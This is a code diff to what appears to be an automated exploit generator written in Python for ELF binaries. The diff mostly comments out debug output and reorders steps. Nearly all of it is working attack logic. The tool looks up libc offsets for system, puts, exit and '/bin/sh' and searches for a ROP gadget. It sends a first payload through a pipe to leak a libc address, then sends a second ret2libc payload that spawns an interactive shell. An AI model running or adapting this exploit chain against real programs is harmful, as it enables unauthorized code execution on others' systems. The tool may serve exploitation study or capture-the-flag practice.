@@ -35,7 +35,7 @@ def validate_program():
     program_name = ""
     program_name = click.prompt('Please enter a program name', type=str)
     print("")
-    print("Program name is", program_name)
+    # print("Program name is", program_name)
 
     if path.exists(program_name) is False:
         print("Program does not exists, exiting...")
@@ -96,7 +96,8 @@ if is_elf is False:
 # determine architect type of binary
 bin_arch = bh.arch
 
-print("The architect is:", bin_arch)
+# print("The architect is:", bin_arch, "bit")
+# print("")
 
 probe_mode = validate_probe_mode(4)
 
@@ -185,11 +186,11 @@ sstart_found, sstart_address = bh.search_asm_function(program_name, '_start')
 print("Found address of _start", sstart_address)
 
 if bin_arch == 32 and has_null_bytes(sstart_address):
-    print("WARNING, address contains NULL bytes, adjusting...")
+    # print("WARNING, address contains NULL bytes, adjusting...")
     sstart_address_int = hex_to_int(sstart_address)
     sstart_address_int = sstart_address_int + 4
     sstart_address = hex(sstart_address_int)[2:]
-    print("Found address of _start[UPDATED]", sstart_address)
+    # print("Found address of _start[UPDATED]", sstart_address)
 
 click_confirm('Press any key to continue to check address offsets')
 
@@ -198,9 +199,31 @@ print("Searching for address offsets")
 print("---------------------------------------------")
 
 print("Offset of system", system_offset)
-print("Offset of printf", printf_offset)
+# print("Offset of printf", printf_offset)
 print("Offset of puts", puts_offset)
 print("offset of exit", exit_offset)
+
+# click_confirm('Press any key to continue find /bin/sh address offset')
+
+# print("")
+# print("Searching for /bin/sh address offset")
+# print("---------------------------------------------")
+
+# find bin/sh string address from libc's rodata
+b_sec_results = bh.search_section(bh.libc_path, '.rodata')
+found_rodata, rodata_address, rodata_start, rodata_end = b_sec_results
+rodata_address_int = hex_to_int(rodata_address)
+rodata_start_int = hex_to_int(rodata_start)
+rodata_end_int = rodata_start_int + hex_to_int(rodata_end)
+
+binsh_offset_int = search_string(bh.libc_path,
+                                 "/bin/sh",
+                                 rodata_start_int,
+                                 rodata_end_int)
+
+binsh_offset_hex = hex(rodata_address_int + binsh_offset_int)
+
+print("Offset of /bin/sh", binsh_offset_hex)
 
 click_confirm('Press any key to continue searching for gadget')
 
@@ -215,7 +238,7 @@ found_gadget = False
 gadget_address = ''
 popregret_address = ''
 for xsection in ax_sections:
-    print("Checking executable section", xsection)
+    # print("Checking executable section", xsection)
 
     ax_add_int = hex_to_int(ax_sections[xsection][0])
     ax_start_int = hex_to_int(ax_sections[xsection][1])
@@ -242,28 +265,6 @@ if found_gadget is False:
     print("Unable to find gadget, exiting...")
     cleanup(payload_name)
     exit()
-
-click_confirm('Press any key to continue find /bin/sh address offset')
-
-print("")
-print("Searching for /bin/sh address offset")
-print("---------------------------------------------")
-
-# find bin/sh string address from libc's rodata
-b_sec_results = bh.search_section(bh.libc_path, '.rodata')
-found_rodata, rodata_address, rodata_start, rodata_end = b_sec_results
-rodata_address_int = hex_to_int(rodata_address)
-rodata_start_int = hex_to_int(rodata_start)
-rodata_end_int = rodata_start_int + hex_to_int(rodata_end)
-
-binsh_offset_int = search_string(bh.libc_path,
-                                 "/bin/sh",
-                                 rodata_start_int,
-                                 rodata_end_int)
-
-binsh_offset_hex = hex(rodata_address_int + binsh_offset_int)
-
-print("Offset of /bin/sh", binsh_offset_hex)
 
 first_evil = Evil_payload_handler(max_payload_size, segfault_offset, bin_arch)
 if found_printf:
@@ -301,7 +302,7 @@ else:
     print("this part of logic is incomplete")
 
 # use fifo pipe instead
-first_evil.write_to_plaintext("debug_" + program_name + "_payload_1")
+# first_evil.write_to_plaintext("debug_" + program_name + "_payload_1")
 
 phandle = Fifo_handler(payload_name)
 phandle.unlink()
@@ -322,9 +323,9 @@ phandle.write(first_evil.get_payload())
 print("First payload is written")
 
 tempstr = payload_name + "\n"
-print("Reading until following bytes:", tempstr.encode('utf-8'))
+# print("Reading until following bytes:", tempstr.encode('utf-8'))
 recv_str = proc.recvuntil(delims=tempstr.encode('utf-8'), timeout=10)
-print("Receive from program with first payload: {}".format(recv_str))
+print("Output received before the leak: {}".format(recv_str))
 
 if len(recv_str) == 0:
     print("Exploit failed")
@@ -334,14 +335,14 @@ if len(recv_str) == 0:
 recvdata = proc.recvline()
 
 if found_printf:
-    print("Full leak", recvdata)
-    print("len of string used", len(payload_name))
+    print("Full leak:", recvdata)
+    # print("len of string used", len(payload_name))
     len_to_ignore = 0
     # TODO: need additional if for 64 bit
     len_to_ignore_end = 4+len_to_ignore
     recvdata = recvdata[len_to_ignore:len_to_ignore_end]
 else:
-    print("Full leak", recvdata)
+    print("Full leak:", recvdata)
     len_to_ignore = 0
     # TODO: need additional if for 64 bit
     len_to_ignore_end = 4+len_to_ignore
@@ -350,9 +351,11 @@ else:
 
 leaked_bytes = bytearray.fromhex(recvdata.hex())
 if found_printf:
+    print("")
     print("Leaked address of printf:",
           hex(int.from_bytes(leaked_bytes, byteorder='little')))
 else:
+    print("")
     print("Leaked address of puts:",
           hex(int.from_bytes(leaked_bytes, byteorder='little')))
 
@@ -378,19 +381,20 @@ system_address = libc_base_address + hex_to_int(system_offset)
 binsh_address = libc_base_address + hex_to_int(binsh_offset_hex)
 exit_address = libc_base_address + hex_to_int(exit_offset)
 
-print("Function system address:", hex(system_address))
-print("String /bin/sh address:", hex(binsh_address))
-print("Function exit address:", hex(exit_address))
+print("system address:", hex(system_address))
+print("/bin/sh address:", hex(binsh_address))
+print("exit address:", hex(exit_address))
 
 second_evil = Evil_payload_handler(max_payload_size, segfault_offset)
 second_evil.add_content(system_address)
 second_evil.add_content(exit_address)
 second_evil.add_content(binsh_address)
 
-print("Second Payload written to pipe")
+print("")
+print("Second payload written")
 
 phandle.write(second_evil.get_payload())
-second_evil.write_to_plaintext("debug_" + program_name + "_payload_2")
+# second_evil.write_to_plaintext("debug_" + program_name + "_payload_2")
 
 # ready to get interactive after sending
 click_confirm('Press any key to get interactive shell')
